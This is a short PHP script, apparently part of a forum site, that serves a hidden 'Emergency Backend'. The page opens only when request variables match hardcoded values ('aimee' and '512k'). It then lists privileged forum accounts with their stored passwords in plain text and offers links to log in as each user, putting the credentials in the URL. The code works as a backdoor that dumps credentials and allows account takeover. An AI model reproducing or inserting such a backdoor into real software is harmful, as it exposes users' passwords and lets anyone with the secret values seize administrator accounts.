<?php

include('../../scripts/dbconnect.php');




if ($pazwort == "aimee")
{

if ($l2 == "512k")
{

echo "<p style=\"background-color: black; color: red; font-weight: bold; text-align: center;\">Emergency Backend</p><hr/>";




$query = "SELECT * from forum_users where userlevel<3 order by userlevel desc";
$result = mysql_query($query);
$num_rows = mysql_num_rows($result);
$row = mysql_fetch_array($result);

while ($row)
      	{
       	$name = $row["username"];
	$gro = $row["userlevel"];
	$own = $row["owner"];
	$pas = $row["password"];



       	echo "<p style=\"background-color: black; color: red; font-weight: bold; text-align: center;\">username: $name<br/>
		password: $pas<br/>
		userlevel: $gro<br/>
		owner: $own<br/>
		<a style=\"color: white; font-weight: bold;\" href=\"../../logincheck.php?u=$name&amp;p=$pas\">login as $name?</a></p>";
				
       	$row = mysql_fetch_array($result);
      	}




echo "<hr/><p style=\"background-color: black; color: red; font-weight: bold; text-align: center;\"><a style=\"color: white; font-weight: bold;\" href=\"../../index.php\">exit</a></p>
</body></html>";
}

}


?>

